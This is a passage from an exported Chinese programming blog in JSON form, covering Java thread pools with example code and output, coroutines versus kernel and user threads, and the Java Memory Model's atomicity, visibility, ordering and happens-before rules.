https://github.com/TFdream/blog/blob/master/contents/Concurrent/Thread_Lifecycle.md - 线程的生命周期 java线程运行怎么有第六种状态？ - https://www.zhihu.com/question/56494969 Java线程中wait状态和block状态的区别? - https://www.zhihu.com/question/27654579/answer/128050125 Java 多线程（七） 线程间的通信——wait及notify方法 - https://www.cnblogs.com/mengdd/archive/2013/02/20/2917956.html [简谈Java的join()方法 - https://www.cnblogs.com/techyc/p/3286678.html (四)Thread.join的作用和原理 - https://segmentfault.com/a/1190000017255019 Java并发编程：线程间协作的两种方式：wait、notify、notifyAll和Condition - https://www.cnblogs.com/dolphin0520/p/3920385.html","comments":true,"categories":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/tags/Java/"}]},{"title":"【Java】多线程 - 线程池（Thread Pool）","date":"2019-02-25T07:42:47.000Z","path":"2019/02/25/【Java】多线程-线程池/","text":"什么是线程池（Thread Pool）？为了避免系统频繁地创建和销毁线程，我们可以让创建的线程进行复用。用线程时从线程池中获取，用完以后不销毁线程，而是归还给线程池（Thread Pool）。 为什么需要使用线程池减少线程创建与切换的开销在没有使用线程池的时候，来了一个任务，就创建一个线程，我们知道系统创建和销毁工作线程的开销很大，而且频繁的创建线程也就意味着需要进行频繁的线程切换，这都是一笔很大的开销。 控制线程的数量使用线程池我们可以有效地控制线程的数量，当系统中存在大量并发线程时，会导致系统性能剧烈下降。 线程池做了什么重复利用有限的线程线程池中会预先创建一些空闲的线程，他们不断的从工作队列中取出任务，然后执行，执行完之后，会继续执行工作队列中的下一个任务，减少了创建和销毁线程的次数，每个线程都可以一直被重用，变了创建和销毁的开销。 JDK 对线程池的支持为了更好的控制多线程，JDK 提供了一套线程池框架。它们都在 java.util.concurrent 包中。 Executor 用来执行任务，它提供了 execute() 方法来执行 Runnable 任务； ThreadPoolExecutor 表示一个线程池； Executors 是一个线程池工厂类，该工厂类包含如下集合静态工厂方法来创建线程池： newFixedThreadPool()：创建一个可重用的、具有固定线程数的线程池 newSingleThreadExecutor()：创建只有一个线程的线程池 newCachedThreadPool()：创建一个具有缓存功能的线程池 newWorkStealingPool()：创建持有足够线程的线程池来支持给定的并行级别的线程池 newScheduledThreadPool()：创建具有指定线程数的线程池，它可以在指定延迟后执行任务线程 newFixedThreadPool()newFixedThreadPool() 返回固定数量的线程池。线程池中的数量始终不变。当有新任务提交时，线程池中若有空闲线程，则立即执行。若没有则放入任务队列中，等待有空闲线程时，处理任务队列中的任务。 实例代码1234567891011121314151617181920212223242526272829303132public class MyFixThreadPool &#123; public static void main(String[] args) throws InterruptedException &#123; // 创建一个线程数固定为5的线程池 ExecutorService service = Executors.newFixedThreadPool(5); System.out.println(\"初始线程池状态：\" + service); for (int i = 0; i &lt; 6; i++) &#123; service.execute(() -&gt; &#123; try &#123; TimeUnit.MILLISECONDS.sleep(1000); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; System.out.println(Thread.currentThread().getName()); &#125;); &#125; System.out.println(\"线程提交完毕之后线程池状态：\" + service); service.shutdown();//会等待所有的线程执行完毕才关闭，shutdownNow：立马关闭 System.out.println(\"是否全部线程已经执行完毕：\" + service.isTerminated());//所有的任务执行完了，就会返回true System.out.println(\"是否已经执行shutdown()\" + service.isShutdown()); System.out.println(\"执行完shutdown()之后线程池的状态：\" + service); TimeUnit.SECONDS.sleep(5); System.out.println(\"5秒钟过后，是否全部线程已经执行完毕：\" + service.isTerminated()); System.out.println(\"5秒钟过后，是否已经执行shutdown()\" + service.isShutdown()); System.out.println(\"5秒钟过后，线程池状态：\" + service); &#125;&#125; 运行结果1234567891011121314初始线程池状态：[Running, pool size = 0, active threads = 0, queued tasks = 0, completed tasks = 0]线程提交完毕之后线程池状态：[Running, pool size = 5, active threads = 5, queued tasks = 1, completed tasks = 0]是否全部线程已经执行完毕：false是否已经执行shutdown()：true执行完shutdown()之后线程池的状态：[Shutting down, pool size = 5, active threads = 5, queued tasks = 1, completed tasks = 0]pool-1-thread-2pool-1-thread-1pool-1-thread-4pool-1-thread-5pool-1-thread-3pool-1-thread-25秒钟过后，是否全部线程已经执行完毕：true5秒钟过后，是否已经执行shutdown()：true5秒钟过后，线程池状态：[Terminated, pool size = 0, active threads = 0, queued tasks = 0, completed tasks = 6] newSingleThreadPool()newSingleThreadPool() 返回只有一个线程的线程池。若有多余一个任务被提交，则放入任务队列中，等待有空闲线程时，按先入先出的顺序执行队列中的任务。 实例代码 123456789101112131415public class SingleThreadPool &#123; public static void main(String[] args) &#123; ExecutorService service = Executors.newSingleThreadExecutor(); for (int i = 0; i &lt; 5; i++) &#123; final int j = i; service.execute(() -&gt; &#123; System.out.println(j + \" \" + Thread.currentThread().getName()); &#125;); &#125; &#125;&#125;复制代码 运行结果 0 pool-1-thread-1 1 pool-1-thread-1 2 pool-1-thread-1 3 pool-1-thread-1 4 pool-1-thread-1 程序分析 可以看到只有pool-1-thread-1一个线程在工作。 newCachedThreadPool()newCachedThreadPool() 返回一个可根据实际情况调整线程数量的线程池。这个方法创建出来的线程池可以被无限扩展，并且当需求降低时会自动收缩。 实例代码 1234567891011121314151617181920212223242526public class CachePool &#123; public static void main(String[] args) throws InterruptedException &#123; ExecutorService service = Executors.newCachedThreadPool(); System.out.println(\"初始线程池状态：\" + service); for (int i = 0; i &lt; 12; i++) &#123; service.execute(() -&gt; &#123; try &#123; TimeUnit.MILLISECONDS.sleep(500); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; System.out.println(Thread.currentThread().getName()); &#125;); &#125; System.out.println(\"线程提交完毕之后线程池状态：\" + service); TimeUnit.SECONDS.sleep(50); System.out.println(\"50秒后线程池状态：\" + service); TimeUnit.SECONDS.sleep(30); System.out.println(\"80秒后线程池状态：\" + service); &#125;&#125; 运行结果 初始线程池状态：[Running, pool size = 0, active threads = 0, queued tasks = 0, completed tasks = 0]线程提交完毕之后线程池状态：[Running, pool size = 12, active threads = 12, queued tasks = 0, completed tasks = 0]pool-1-thread-3pool-1-thread-4pool-1-thread-1pool-1-thread-2pool-1-thread-5pool-1-thread-8pool-1-thread-9pool-1-thread-12pool-1-thread-7pool-1-thread-6pool-1-thread-11pool-1-thread-1050秒后线程池状态：[Running, pool size = 12, active threads = 0, queued tasks = 0, completed tasks = 12]80秒后线程池状态：[Running, pool size = 0, active threads = 0, queued tasks = 0, completed tasks = 12] 程序分析 因为我们每个线程任务至少需要500毫秒的执行时间，所以当我们往线程池中提交12个任务的过程中，基本上没有空闲的线程供我们重复使用，所以线程池会创建12个线程。 缓存中的线程默认是60秒没有活跃就会被销毁掉，可以看到在50秒钟的时候回，所有的任务已经完成了，但是线程池线程的数量还是12。 80秒过后，可以看到线程池中的线程已经全部被销毁了。 newScheduledThreadPool()newScheduledThreadPool() 返回一个 ScheduledExecutorService 对象，并可指定线程数量。 示例代码 下面代码每500毫秒打印一次当前线程名称以及一个随机数字。 123456789public class MyScheduledPool &#123; public static void main(String[] args) &#123; ScheduledExecutorService service = Executors.newScheduledThreadPool(4); service.scheduleAtFixedRate(() -&gt; &#123; System.out.println(Thread.currentThread().getName() + new Random().nextInt(1000)); &#125;, 0, 500, TimeUnit.MILLISECONDS); &#125;&#125; Reference Java多线程系列——线程池简介 - https://www.cnblogs.com/zhengbin/p/7750077.htmls Java线程池了解一下 - https://juejin.im/post/5c5259ca51882524a76727db 线程池的介绍及简单实现 - https://www.ibm.com/developerworks/cn/java/l-threadPool/index.html","comments":true,"categories":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/tags/Java/"}]},{"title":"【Operating System】进程 - 协程（Coroutines）","date":"2019-02-25T07:22:34.000Z","path":"2019/02/25/【Operating-System】进程-协程（Coroutines）/","text":"背景线程模型在现代计算机结构中，先后提出过两种线程模型：用户级线程（user-level threads）和内核级线程（kernel-level threads）。 用户级线程（user-level threads）所谓用户级线程（user-level threads）是指，应用程序在操作系统提供的单个控制流的基础上，通过在某些控制点（比如系统调用）上分离出一些虚拟的控制流，从而模拟多个控制流的行为。由于应用程序对指令流的控制能力相对较弱，所以，用户级线程之间的切换往往受线程本身行为以及线程控制点选择的影响，线程是否能公平地获得处理器时间取决于这些线程的代码特征。 而且，支持用户级线程的应用程序代码很难做到跨平台移植，以及对于多线程模型的透明。用户级线程模型的优势是线程切换效率高，因为它不涉及系统内核模式和用户模式之间的切换；另一个好处是应用程序可以采用适合自己特点的线程选择算法，可以根据应用程序的逻辑来定义线程的优先级，当线程数量很大时，这一优势尤为明显。但是，这同样会增加应用程序代码的复杂性。有一些软件包（如POSIXThreads 或Pthreads 库）可以减轻程序员的负担。 内核级线程（kernel-level threads）内核级线程往往指操作系统提供的线程语义，由于操作系统对指令流有完全的控制能力，甚至可以通过硬件中断来强迫一个进程或线程暂停执行，以便把处理器时间移交给其他的进程或线程，所以，内核级线程有可能应用各种算法来分配处理器时间。线程可以有优先级，高优先级的线程被优先执行，它们可以抢占正在执行的低优先级线程。在支持线程语义的操作系统中，处理器的时间通常是按线程而非进程来分配， 因此，系统有必要维护一个全局的线程表，在线程表中记录每个线程的寄存器、状态以及其他一些信息。然后，系统在适当的时候挂起一个正在执行的线程，选择一个新的线程在当前处理器上继续执行。这里“适当的时候”可以有多种可能，比如：当一个线程执行某些系统调用时，例如像 sleep 这样的放弃执行权的系统函数，或者像 wait 或 select 这样的阻塞函数；硬中断（interrupt）或异常（exception）；线程终止时，等等。由于这些时间点的执行代码可能分布在操作系统的不同位置，所以，在现代操作系统中，线程调度（thread scheduling）往往比较复杂，其代码通常分布在内核模块的各处。 内核级线程的好处是，应用程序无须考虑是否要在适当的时候把控制权交给其他的线程，不必担心自己霸占处理器而导致其他线程得不到处理器时间。应用线程只要按照正常的指令流来实现自己的逻辑即可，内核会妥善地处理好线程之间共享处理器的资源分配问题。然而，这种对应用程序的便利也是有代价的，即，所有的线程切换都是在内核模式下完成的，因此，对于在用户模式下运行的线程来说，一个线程被切换出去，以及下次轮到它的时候再被切换进来，要涉及两次模式切换：从用户模式切换到内核模式，再从内核模式切换回用户模式。在 Intel 的处理器上，这种模式切换大致需要几百个甚至上千个处理器指令周期。但是，随着处理器的硬件速度不断加快，模式切换的开销相对于现代操作系统的线程调度周期（通常几十毫秒）的比例正在减小，所以，这部分开销是完全可以接受的。 除了线程切换的开销是一个考虑因素以外，线程的创建和删除也是一个重要的考虑指标。当线程的数量较多时，这部分开销是相当可观的。虽然线程的创建和删除比起进程要轻量得多，但是，在一个进程内建立起一个线程的执行环境，例如，分配线程本身的数据结构和它的调用栈，完成这些数据结构的初始化工作，以及完成与系统环境相关的一些初始化工作，这些负担是不可避免的。另外，当线程数量较多时，伴随而来的线程切换开销也必然随之增加。所以，当应用程序或系统进程需要的线程数量可能比较多时，通常可采用线程池技术作为一种优化措施，以降低创建和删除线程以及线程频繁切换而带来的开销。 在支持内核级线程的系统环境中，进程可以容纳多个线程，这导致了多线程程序设计（multithreaded programming）模型。由于多个线程在同一个进程环境中，它们共享了几乎所有的资源，所以，线程之间的通信要方便和高效得多，这往往是进程间通信（IPC，Inter-Process Communication）所无法比拟的，但是，这种便利性也很容易使线程之间因同步不正确而导致数据被破坏，而且，这种错误存在不确定性，因而相对来说难以发现和调试。 什么是协程（Coroutines）协程（Coroutines）是一种用户态的轻量级线程，协程比线程更加轻量级。正如一个进程可以拥有多个线程一样，一个线程也可以拥有多个协程。 协程通过协作而不是抢占来进行切换。相对于进程或者线程，协程所有的操作都可以在用户态完成，创建和切换的消耗更低。总的来说，协程为协同任务提供了一种运行时抽象，这种抽象非常适合于协同多任务调度和数据流处理。在现代操作系统和编程语言中，因为用户态线程切换代价比内核态线程小，协程成为了一种轻量级的多任务模型。 从编程角度上看，协程的思想本质上就是控制流的主动让出（yield）和恢复（resume）机制，迭代器常被用来实现协程，所以大部分的语言实现的协程中都有 yield 关键字，比如 Python、PHP、Lua。但也有特殊比如 Go 就使用的是通道来通信。 协程的调度完全由用户控制。协程拥有自己的寄存器上下文和栈。协程调度切换时，将寄存器上下文和栈保存到其他地方，在切回来的时候，恢复先前保存的寄存器上下文和栈，直接操作栈则基本没有内核切换的开销，可以不加锁的访问全局变量，所以上下文的切换非常快。 最重要的是，协程不是被操作系统内核所管理，而完全是由程序所控制（也就是在用户态执行）。 这样带来的好处就是性能得到了很大的提升，不会像线程切换那样消耗资源。 既然协程这么好，它到底是怎么来使用的呢？ 由于 Java 的原生语法中并没有实现协程（某些开源框架实现了协程，但是很少被使用），所以我们来看一看 python 当中对协程的实现案例，同样以生产者消费者模式为例： 这段代码十分简单，即使没用过python的小伙伴应该也能基本看懂。 代码中创建了一个叫做consumer的协程，并且在主线程中生产数据，协程中消费数据。 其中 yield 是python当中的语法。当协程执行到yield关键字时，会暂停在那一行，等到主线程调用send方法发送了数据，协程才会接到数据继续执行。 但是，yield让协程暂停，和线程的阻塞是有本质区别的。协程的暂停完全由程序控制，线程的阻塞状态是由操作系统内核来进行切换。 因此，协程的开销远远小于线程的开销。 协程的应用有哪些编程语言应用到了协程呢？我们举几个栗子： Lua语言 Lua从5.0版本开始使用协程，通过扩展库coroutine来实现。 Python语言 正如刚才所写的代码示例，python可以通过 yield/send 的方式实现协程。在python 3.5以后， async/await 成为了更好的替代方案。 Go语言 Go语言对协程的实现非常强大而简洁，可以轻松创建成百上千个协程并发执行。 Java语言 如上文所说，Java语言并没有对协程的原生支持，但是某些开源框架模拟出了协程的功能，有兴趣的小伙伴可以看一看Kilim框架的源码： https://github.com/kilim/kilim Reference 漫画：什么是协程？ - IT程序猿 - https://www.itcodemonkey.com/article/4620.html 协程 - http://www.syyong.com/Basis-of-computer/Coroutine.html","comments":true,"categories":[{"name":"OperatingSystem","slug":"OperatingSystem","permalink":"http://swsmile.info/categories/OperatingSystem/"}],"tags":[{"name":"Operating System","slug":"Operating-System","permalink":"http://swsmile.info/tags/Operating-System/"}]},{"title":"【Java】JVM - Java 内存模型（Java Memory Model）","date":"2019-02-25T04:15:51.000Z","path":"2019/02/25/【Java】JVM-内存模型/","text":"背景重排序（Instruction Reordering）在执行程序时为了提高性能，编译器和处理器常常会对指令做重排序。 重排序分三类： 编译器优化的重排序：编译器在不改变单线程程序语义的前提下，可以重新安排语句的执行顺序。 指令级并行的重排序。现代处理器采用了指令级并行技术来将多条指令重叠执行。如果不存在数据依赖性，处理器可以改变语句对应机器指令的执行顺序。 内存系统的重排序。由于处理器使用缓存和读／写缓冲区，这使得加载和存储操作看上去可能是在乱序执行。 从 Java 源代码到最终实际执行的指令序列，会分别经历下面三种重排序： 上面的这些重排序都可能导致多线程程序出现内存可见性问题。对于编译器，JMM 的编译器重排序规则会禁止特定类型的编译器重排序（不是所有的编译器重排序都要禁止）。对于处理器重排序，JMM 的处理器重排序规则会要求 Java 编译器在生成指令序列时，插入特定类型的内存屏障指令，通过内存屏障指令来禁止特定类型的处理器重排序（不是所有的处理器重排序都要禁止）。 JMM 属于语言级的内存模型，它确保在不同的编译器和不同的处理器平台之上，通过禁止特定类型的编译器重排序和处理器重排序，为程序员提供一致的内存可见性保证。 Java 内存模型（Java Memory Model，JMM）Java 虚拟机规范中试图定义一种 Java 内存模型（Java Memory Model，简称 JMM），来屏蔽掉各种硬件和操作系统的内存访问差异，以实现让 Java 程序在各种平台下都能达到一致的内存访问效果，不必因为不同平台上的物理机的内存模型的差异，对各平台定制化开发程序。 在此之前，主流程序语言（如C/C++等）直接使用物理硬件和操作系统的内存模型，因此，会由于不同平台上内存模型的差异，有可能导致程序在一套平台上并发完全正常，而在另外一套平台上并发访问却经常出错，因此在某些场景下就不许针对不同的平台来编写程序。 Java内存模型组成Java内存模型包括主内存和工作内存两个部分： 主内存（Main Memory）：用来存储线程之间的共享变量； 工作内存（Working Memory）：存储每个线程使用到的变量副本。 即当某个线程要读取主内存中的某个变量时，JVM 会先将这个变量从主内存中拷贝到线程对应的工作内存；当这个线程完进行了对这个变量的修改后，JVM 会将这个变量在工作内存中的值同步到主内存中。 Java 内存模型规定： 所有变量都存储在主内存（Main Memory）中； 每个线程都有自己独立的工作内存（Working Memory），里面保存了该线程使用到的变量副本（主内存中该变量的拷贝）； 线程对共享变量的所有操作都必须在自己的工作内存中进行，而不能直接对主内存中的变量进行读写； 不同线程之间也无法直接访问其他线程工作内存中的变量，线程间的变量值传递需要主内存来完成。 内存间的交互动作关于主内存与工作内存之间具体的交互协议，即一个变量如何从主内存拷贝到工作内存、如何从工作内存同步回主内存之类的实现细节，Java 内存模型中定义了下面 8 种操作来完成。 虚拟机实现时，必须保证下面介绍的每种操作都是原子的，不可再分的（对于 double 和 long 型的变量来说，load、store、read、和 write 操作在某些平台上允许有例外）。 动作 作用 lock（锁定） 作用于主内存变量，把一个变量标识为一条线程独占的状态 unlock（解锁） 作用于主内存的变量，把一个处于锁定状态的变量释放出来，释放后的变量才可以被其他线程锁定 read（读取） 作用于主内存的变量，把一个变量的值从主内存传输到线程的工作内存中，以便随后的load动作使用 load（载入） 作用于工作内存的变量，把read操作从主存中得到的变量值放入工作内存的变量副本中 use（使用） 作用于工作内存的变量，把工作内存中一个变量的值传递给执行引擎，每当虚拟机遇到一个需要使用到变量的值的字节码指令时将会执行这个操作 assign（赋值） 作用于工作内存的变量，把一个从执行引擎接收到的值赋给工作内存中的变量，每当虚拟机遇到一个给变量赋值的字节码指令时执行这个操作 store（存储） 作用于工作内存的变量，把工作内存中一个变量的值传送到主内存中，以便随后的write操作使用 write（写入） 作用于主内存的变量，把store操作从工作内存中得到的变量的值放入主内存的变量中 除此之外，Java 内存模型还规定了在执行上述 8 种基本操作时，必须满足如下规则： 不允许 read 和 load ，store 和 write 操作之一单独出现，即不允许一个变量从主内存读取了但工作内存不接受，或者从工作内存发起回写了但主内存不接受的情况出现。 不允许一个线程丢弃它最近的 assign 操作，即变量在工作内存中改变了之后，必须把该变化同步回主内存。 一个新的变量只允许在主内存中诞生，不允许工作内存直接使用未初始化的变量。 不允许一个线程无原因地（没有发生过任何 assign 操作）把数据从线程的工作内存同步回主内存中。 一个新的变量只能在主内存中“诞生”，不允许在工作内存中直接使用一个未被初始化（ load 或 assign）的变量，换句话说，就是对一个变量实施 use、store 操作之前，必须先执行过了 assign 和 load 操作。 一个变量同一时刻只允许一条线程进行 lock 操作，但同一线程可以 lock 多次，lock 多次之后必须执行同样次数的 unlock 操作。 如果对一个变量执行 lock 操作，那将会清空工作内存中此变量的值，在执行引擎使用这个变量前，需要重新执行 load 或 assign 操作初始化变量的值。 如果一个变量事先没有被 lock 操作锁定，那就不允许对它执行 unlock 操作，也不允许去 unlock 一个被其他线程锁定住的变量。 对一个变量执行 unlock 操作之前，必须先把此变量同步回主内存中（执行 store、write 操作）。 这 8 种操作定义相当严禁，实践起来又比较麻烦，但是可以有助于我们理解多线程的工作原理。因此，有一个与此 8 种操作相等的 Happen-before 原则。 JVM 对 Java 内存模型的实现 在 JVM 内部，Java 内存模型把内存分成了两部分：线程栈区（Thread Stack）和堆区（Heap）： JVM 中运行的每个线程都拥有自己的线程栈，线程栈包含了当前线程执行的方法调用相关信息，我们也把它称作调用栈（Call stack）。随着代码的不断执行，调用栈会不断变化。 线程栈还包含了当前方法的所有本地变量信息。一个线程只能读取自己的线程栈，也就是说，线程中的本地变量对其它线程是不可见的。即使两个线程执行的是同一段代码，它们也会各自在自己的线程栈中创建本地变量，因此，每个线程中的本地变量都会有自己的版本。 所有原始类型（boolean,byte,short,char,int,long,float,double）的本地变量都直接保存在线程栈当中，对于它们的值各个线程之间都是独立的。对于原始类型的本地变量，一个线程只能传递这个本地变量的副本给另一个线程，而无法在这两个线程之间共享这个变量（注意，我们讨论的是本地变量，如果这个变量已经被声明成volatile了，则不是本地变量了）。 堆区包含了 Java 应用创建的所有对象信息，不管对象是哪个线程创建的，其中的对象包括原始类型的封装类（如Byte、Integer、Long等等）。不管对象是属于一个成员变量还是方法中的本地变量，它都会被存储在堆区。 下图展示了调用栈和本地变量都存储在栈区，对象都存储在堆区： 原子性（atomicity）、可见性（visibility）以及有序性（ordering）的保证Java 内存模型是围绕着并发编程中原子性（atomicity）、可见性（visibility）以及有序性（ordering）这三个特征来建立的。 那么， Java 语言本身对这三个特性提供了哪些保证呢？ 原子性（Atomicity）由 Java 内存模型来直接保证的原子性变量操作包括 read、load、assign、use、store、write，而对基本数据类型变量的访问读写是具备原子性的（long和double的非原子性协定例外），即这些操作是不可被中断的，要么执行，要么不执行。 如果应用场景需要一个更大范围的原子性保证，Java 内存模型提供了 lock 和 unlock 操作来满足这种需求。尽管虚拟机未把 lock 与 unlock 操作直接开放给用户使用，但是却提供了更高层次的字节码指令 monitorenter 和 monitorexit 来隐式地使用这两个操作，这两个字节码指令反映到 Java 代码中就是同步块—— synchronized 关键字，因此在 synchronized 块之间的操作也具备原子性。 例子上面的分析虽然看起来简单，但是理解起来并不是那么容易。看下面一个例子： 请分析以下哪些操作是原子性操作： 123456789int x;//语句1x = 10;//语句2y = x;//语句3x++;//语句4x = x + 1; 其实，只有语句1是原子性操作，其他三个语句都不是原子性操作。 语句1是直接将数值10赋值给x，也就是说线程执行这个语句的会直接将数值10写入到工作内存中。 语句2实际上包含2个操作，它先要去读取x的值，再将x的值写入工作内存，虽然读取x的值以及将x的值写入工作内存，这2个操作都是原子性操作，但是合起来就不是原子性操作了。 同样的，x++和 x = x+1包括3个操作：读取x的值，进行加1操作，写入新的值。 也就是说，只有简单的读取、赋值（而且必须是将数字赋值给某个变量，变量之间的相互赋值不是原子操作）才是原子操作。 不过这里有一点需要注意：在 32 位平台下，对 64 位数据的读取和赋值是需要通过两个操作来完成的，不能保证其原子性。 从上面可以看出，Java 内存模型只保证了基本读取和赋值是原子性操作，如果要实现更大范围操作的原子性，可以通过 synchronized 和 Lock 来实现。由于 synchronized 和 Lock 能够保证任一时刻只有一个线程执行该代码块，那么自然就不存在原子性问题了，从而保证了原子性。 synchronized 保证原子性synchronized 能够实现原子性和可见性。在 Java 内存模型中，synchronized 规定，线程在加锁时，先清空工作内存→在主内存中拷贝最新变量的副本到工作内存→执行完代码→将更改后的共享变量的值刷新到主内存中→释放互斥锁。 可见性（Visibility）可见性（Visibility）指当一个线程修改了线程共享变量的值，其它线程能够立即感知到这个修改。 共享变量可见性实现的原理Java 内存模型是通过在变量修改后将新值同步回主内存，在变量读取前从主内存刷新变量值这种依赖主内存作为传递媒介的方法来实现可见性的，无论是普通变量还是volatile变量都是如此。 非 volatile 变量与 volatile 变量的区别是 volatile 变量能够被保证新值能立即同步到主内存，以及每次使用前先从主内存获取最新的数值。因为，我们可以说 volatile 保证了线程操作时变量的可见性，而普通变量（非 volatile 变量）则不能保证这一点。 可见性支持Java 语言层面支持的可见性实现方式: volatile 关键字 synchronized 关键字和 Lock 锁 final *volatile *关键字对于可见性，Java 提供了 volatile 关键字来保证可见性。 当一个共享变量被 volatile 修饰时，JVM 会保证当其被修改后，立即将新值更新到主存，且当有其他线程需要读取时，JVM会先去主内存中读取该变量最新的值（触发缓存行失效）。 而普通的共享变量不能保证可见性，因为普通共享变量被修改之后，什么时候被同步更新到主存是不确定的。因此，当其他线程去读取时，此时主存中可能还是原来的旧值，因此无法保证可见性。 synchronized 关键字和 Lock 锁通过 synchronized 关键字和 Lock 也能够保证可见性，synchronized 关键字和 Lock 锁能保证同一时刻只有一个线程获取锁然后执行同步代码，并且在释放锁之前会将对变量的修改刷新到主存当中。因此可以保证可见性。 从 Java 内存模型的角度来说，synchronized 块的可见性是由“对一个变量执行 unlock 操作之前，必须先把此变量同步回主内存中（执行 store 和 write 操作）”这条规则获得的。 final 关键字final 关键字的可见性是指：被 final 修饰的字段在构造器中一旦初始化完成，并且构造器没有把“this”引用传递出去，那么在其它线程中就能看见 final 字段的值。 被 final 关键字修饰的变量相对是一种特殊情况，因为该变量的赋值是在构造函数执行完成之前。而在构造函数执行完成之后，该变量就不存在修改操作了，因而被 final 关键字修饰的变量是一个不可变（immutable）变量。不可变（immutable）变量总是具有可见性，而且它也是线程安全的。 123456789public static final int i;public final int j;static&#123; i = 0;&#125;&#123; // 也可以选择在构造函数中初始化 j = 0;&#125; 在上面例子中， 变量 i 和 j 都具备可见性。 有序性（Ordering）在 Java 内存模型中，允许编译器和处理器对指令进行重排序，但是重排序过程不会影响到单线程程序的执行（这就是 as-if-serial），却会影响到多线程并发执行的正确性。 背景我们来看一个可能触发有序性问题的例子： 1234567891011121314151617181920212223242526272829303132public class ReorderExample &#123; private int a = 2; private boolean flg = false; public void method1() &#123; a = 1; flg = true; &#125; public void method2() &#123; if (flg) &#123; if (a == 2) &#123; //2 might be printed out on some JVM/machines System.out.println(\"a = \" + a); &#125; &#125; &#125; public static void main(String[] args) &#123; for (int i = 0; i &lt; 100000; i++) &#123; ReorderExample reorderExample = new ReorderExample(); Thread thread1 = new Thread(() -&gt; &#123; reorderExample.method1(); &#125;); Thread thread2 = new Thread(() -&gt; &#123; reorderExample.method2(); &#125;); thread1.start(); thread2.start(); &#125; &#125;&#125; 事实上，a = 2 只是可能会被打印。在我的macOS下执行了几次，a = 2都始终没有被打印出来过。 线程内表现为串行的语义（Within-Thread As-If-Serial Semantics）as-if-serial 语义的意思是：不管怎么重排序（编译器和处理器为了提高并行度），单线程程序的执行结果不会改变。 编译器、运行时（runtime）和处理器都必须遵守 as-if-serial 语义。 为了遵守 as-if-serial 语义，编译器和处理器不会对存在数据依赖关系的操作做重排序，因为这种重排序会改变执行结果。但是，如果操作之间不存在数据依赖关系，这些操作就可能被编译器和处理器重排序。 举个例子： 123int a = 1;int b = 2;int c = a + b; 假如没有重排序这个东西，CPU肯定会按照从上往下的执行顺序执行：先执行 a = 1、然后 b = 2、最后 c = a + b，这也符合我们的阅读习惯。 但是，上文也提及了：CPU 为了提高运行效率，在执行时序上不会按照刚刚所说的时序执行，很有可能是 b = 2 ， a = 1 ，c = a + b 。 因为只需要在变量 c 需要变量 a + b 的时候能够得到正确的值就行了，JVM 允许这样的行为。 这种现象就是线程内表现为串行的语义。 有序性支持Java 语言层面支持的有序性实现方式: volatile 关键字：支持部分有序性，本质上，是通过禁止与 volatile 变量有关的指令重排序。 synchronized 关键字和 Lock 锁：保证每个时刻只有一个线程执行同步代码。 volatile在 Java 里面，可以通过 volatile 关键字来保证部分的“有序性”，因为 volatile 机制只禁止与 volatile 变量有关的指令重排序 。 synchronized 关键字和 Lock 锁另外，可以通过 synchronized 关键字和 Lock 锁来保证有序性，很显然， synchronized 关键字和 Lock 锁保证每个时刻只有一个线程执行同步代码，相当于是让线程顺序执行同步代码，自然就保证了有序性。 另外，Java 内存模型具备一些先天的“有序性”，即不需要通过任何手段就能够得到保证的有序性，这个通常也称为 happens-before 原则。 先行发生原则（happens-before 原则）先行发生原则（happens-before 原则）非常重要，它是判断数据是否存在竞争、线程是否安全的主要依据，依靠这个原则，我们可以解决在并发环境下，两操作之间是否可能存在冲突的所有问题。 先行发生是 Java 内存模型中定义的两项操作之间的偏序关系，如果操作 A 先行发生于操作 B，那么操作 A 产生的影响能够被操作 B 观察到。“影响”包括修改了内存中的共享变量的值、发送了消息、调用了方法等。 例子举个例子： 123456///以下操作在线程A中执行i = 1;//以下操作在线程B中执行j = i;//以下操作在线程C中执行i = 2; 假设线程 A 中的操作 i=1 先行发生于线程 B 的操作 j=i ，那么就可以确定在线程 B 的操作执行之后，j 一定等于 1 。因为：根据先行发生原则，i=1 的结果可以被 B 观察到。 现在保持 A 先行发生于 B，线程 C 出现在 A 与 B 之间，但是线程 C 与 B 没有先行发生关系。那么 j 会等于多少呢？ 答案是不确定。因为线程 C 对变量 i 的影响可能会被 B 观察到，也可能不会。因为两者之间没有先行发生关系。这时候线程 B 就存在读取到过期数据的风险，因而不具备多线程安全性。 下面是 Java 内存模型下一些”天然的“happens-before关系，这些 happens-before 关系无须任何同步器协助就已经存在，可以在编码中直接使用。 如果两个操作之间的关系不在此列，或者无法从下列规则推导出来的话，它们就没有顺序性保障，虚拟机可以对它们进行随意地重排序。 程序次序规则（Program Order Rule） ：一个线程内，按照代码顺序，书写在前面的操作先行发生于书写在后面的操作。 管程锁定规则（Monitor Lock Rule）：一个管程（monitor）上的 unLock 操作先行发生于后面对同一个管程的 lock 操作。 volatile 变量规则（volatile Variable Rule）：对一个 volatile 变量的写操作先行发生于后面对这个变量的读操作。 传递规则（Transitivity） ：如果操作A先行发生于操作B，而操作B又先行发生于操作C，则可以得出操作A先行发生于操作C。 线程启动规则（Thread Start Rule） Thread对象的start()方法Happens-Before此线程的每一个动作。 线程终止规则（Thread Termination Rule） 线程中的所有操作都Happens-Before对此线程的终止检测。 线程中断规则（Thread Interruption Rule） 对线程interrupt()方法的调用Happens-Before被中断线程的代码检测到中断事件的发生，可以通过Thread.interrupt()方法检测到是否有中断发生。 对象终结规则（Finalizer Rule） 一个对象的初始化完成（构造函数执行结束）Happens-Before它的finalize()方法的开始。 对于程序次序规则来说，我的理解就是一段程序代码的执行在单个线程中看起来是有序的。 注意，虽然这条规则中提到“书写在前面的操作先行发生于书写在后面的操作”，这个应该是程序看起来执行的顺序是按照代码顺序执行的，因为虚拟机可能会对程序代码进行指令重排序。 虽然进行重排序，但是最终执行的结果是与程序顺序执行的结果一致的，它只会对不存在数据依赖性的指令进行重排序。因此，在单个线程中，程序执行看起来是有序执行的，这一点要注意理解。事实上，这个规则是用来保证程序在单线程中执行结果的正确性，但无法保证程序在多线程中执行的正确性。 Reference 《深入理解Java虚拟机》 Java多线程之内存可见性 - https://www.jianshu.com/p/a96be26c9f6e happens-before规则和as-if-serial语义 - https://blog.csdn.net/u010571316/article/details/64906481 从单例模式到Happens-Before - 